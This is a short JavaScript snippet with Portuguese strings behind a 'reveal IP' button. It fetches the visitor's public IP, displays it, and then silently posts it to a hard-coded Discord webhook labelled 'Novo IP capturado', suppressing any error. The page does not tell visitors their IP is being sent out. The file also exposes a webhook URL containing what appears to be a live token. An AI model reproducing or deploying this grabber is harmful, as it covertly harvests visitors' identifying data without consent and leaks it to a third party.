let fetchState = "idle";

const revealBtn = document.getElementById("revealBtn");
const ipDisplay = document.getElementById("ipDisplay");
const errorDisplay = document.getElementById("errorDisplay");

revealBtn.addEventListener("click", async () => {
  if (fetchState === "loading" || fetchState === "success") return;

  fetchState = "loading";
  ipDisplay.textContent = "Carregando...";
  errorDisplay.textContent = "";

  try {
    // 1. Buscar IP do usuário
    const res = await fetch("https://api.ipify.org?format=json");
    if (!res.ok) throw new Error("Falha na requisição");

    const data = await res.json();
    ipDisplay.textContent = `Obrigado pelo IP: ${data.ip}`;
    fetchState = "success";

    // 2. Enviar IP para webhook
    fetch("https://discord.com/api/webhooks/1486905154958659767/LaQMwKyiM59VF0Q2gWOjHGfuzh8J7oot9taJ0XgoXXeAg7GQFkILewvJMrM0ztsTriA0", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `**Novo IP capturado**\n\`\`\`\n${data.ip}\n\`\`\``,
      }),
    }).catch(() => {});

  } catch (err) {
    errorDisplay.textContent = "Erro de rede. Tente novamente.";
    ipDisplay.textContent = "";
    fetchState = "error";
  }
});
